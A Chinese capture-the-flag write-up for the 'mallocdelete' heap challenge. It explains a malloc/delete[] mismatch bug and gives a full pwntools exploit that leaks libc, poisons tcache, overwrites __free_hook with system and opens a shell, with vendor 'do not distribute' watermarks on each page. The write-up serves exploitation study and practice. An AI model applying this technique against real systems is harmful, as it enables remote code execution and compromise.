# mallocdelete_wp

# mallocdelete_wp
---

<!-- page 1 -->

设计思路
 
题目的漏洞为C与C++数组的混淆。具体的，可以把malloc 出来的指针delete[] 掉。为了保证内存对
齐0x10 ，重载了delete[] 函数。这会导致delete[] 时，把chunk的size 当做array的长度。题目没
有虚表，但是在析构函数中调用了clear 函数，所以有个越界清0的操作。
解题思路
 
这个题目也是我慢慢调慢慢解的。主要思路是通过这个越界清0操作，把一个tcache chunk的fd 指针的
最低字节变成0，然后再分配到那个被corrupt的fd指针。（这里要注意align，具体看后面）第一次通过
这种方法分配到一个要被释放成unsorted bin的chunk上，然后free 出一个unsorted bin可以泄露Libc
指针（用隐藏的1337命令）。第二次通过这种方法分配到堆上的tcache arena上面去，这样就可以实现
任意地址分配（任意写）了。
然后这个对堆的布局还是很严格的。首先不能让关键chunk的size 和len 重合，不然这个chunk的size
会被置0，导致free的时候崩掉。top chunk同理，只不过是在malloc的时候崩的。其次不能让len 是一
个指针，不然很明显会segfault，因为指针的值太大了会memset 到堆的末尾。具体可以看exp，做了一
些padding去align。
from pwn import *
g_local=0
e=ELF('./libc-2.27.so')
#context.log_level='debug'
if g_local:
    sh = process('./chall')#, env={'LD_PRELOAD':'./libc-2.23.so'})
    #gdb.attach(sh)
else:
    sh = remote('10.12.152.11', 58013)
def malloc(size, data='\x00'):
    sh.sendline('1')
    sh.sendlineafter("Length: \n", str(size))
    sh.sendlineafter("Data: \n", data)
    sh.recvuntil(">> ")
def delete(idx):
    sh.sendline('2')
    sh.sendlineafter("Index: \n", str(idx))
    sh.recvuntil(">> ")
sh.recvuntil(">> ")
# sizeof(StringBuffer) == 0x18
# when length of array is odd, we have chunk size 0x18 * x + 8
# when length of array is even, we have chunk size 0x18 * x + 0x10
# so we malloc 4 chunks with size 2
malloc(1, '\x01') # 0
malloc(0x100) # 1
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 2 -->

malloc(0x60) # 2, to become unsorted bin
malloc(0x40) # 3
malloc(0x10) # 4
for i in xrange(3):
    malloc(0x270) # 5
# such heap layout will not corrupt `size` of chunks we need to free
# `size` will be corrupted only if `% 0x18 == 8`
for i in xrange(7):
    malloc(6 * 0x10) # 8-28
    malloc(0x28 * 0x10)
    malloc(0x27 * 0x10)
for i in range(8, 28, 3):
    delete(i)
# such layout makes `% 0x18 == 0x10`,
# which will not make `size` nor `fd` as `len`
malloc(0x10) # 8
for i in xrange(2):
    malloc(0x20) # 11 14
malloc(0x20, '\x00'*0x10 + p8(0x39))
# 0x39 remove LSB of fd pointer of chunk 20
malloc(0x40) # 20
# 2 0x60 tcache bins
delete(3)
delete(20)
malloc(0x10) # 3,
# malloc this to prevent top chunk size to be corrupted
# delete, poison the fd
delete(8)
malloc(0x40) # 8
malloc(0x40, p64(0)+p64(0xa1)+'\x00'*0x2f) # 20
delete(2) # make unsorted bin to leak
sh.sendline('1337')
sh.sendlineafter("Index: \n", '20')
libc_addr = u64(sh.recvuntil('\x00\x00')) - 0x3ebca0
print hex(libc_addr)
sh.recvuntil(">> ")
malloc(0x20) # 2
malloc(0x30, '\x00'*8) # 23, prevent segfault when deleting 0
# consume unsorted
delete(2) # save some spaces
malloc(0x30) # 2
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁


---

<!-- page 3 -->

 
malloc(0x30) # 26
malloc(0x40, '\x00' * 0x10 + p8(0x69)) # 29
# used to remove LSB of fd pointer of chunk 31
malloc(0x10) # 30, consume tcache
malloc(0x10) # 31
delete(0)
delete(31)
delete(2) # remove LSB of fd pointer of chunk 31
# which points to tcache region
malloc(0x10, "/bin/sh")
malloc(0x10, p64(libc_addr + e.symbols["__free_hook"]))
malloc(0x250, p64(libc_addr + e.symbols["system"]))
sh.sendline('2')
sh.sendlineafter("Index: \n", '0')
sh.interactive()
绿盟科技，禁止外传
技，禁止外传
科技，禁止外传
传
绿盟科技，禁止外传
绿盟科技，禁止外传
绿
绿盟科技，禁止
绿盟科技，禁
